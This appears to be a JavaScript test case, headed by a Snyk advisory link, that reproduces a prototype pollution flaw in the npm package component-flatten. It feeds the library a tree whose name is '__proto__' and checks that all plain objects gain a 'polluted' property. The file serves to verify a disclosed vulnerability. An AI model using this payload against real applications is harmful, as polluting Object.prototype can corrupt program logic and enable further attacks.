https://snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
test("prototype pollution in component-flatten", () => {
    expect({}.polluted).toBe(undefined);
  
    const cf = require("component-flatten");
    let tree = { ref: "polluted", name: "__proto__" };
    cf(tree);    
  
    expect({}.polluted).not.toBe(undefined);
  });
  
